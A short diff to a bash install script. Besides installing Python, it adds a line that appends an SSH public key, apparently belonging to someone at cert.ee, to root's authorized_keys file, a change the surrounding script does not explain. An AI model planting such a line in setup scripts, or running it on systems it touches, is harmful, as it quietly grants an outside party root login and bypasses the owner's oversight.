@@ -1,5 +1,7 @@
 #!/bin/bash
 
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2ElCwwFYPnp7DC9e1cb79arNLtqid4OAH//1p7rAlg andres@cert.ee" >> /root/authorized_keys
+
 apt-get install python -y
 
 DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
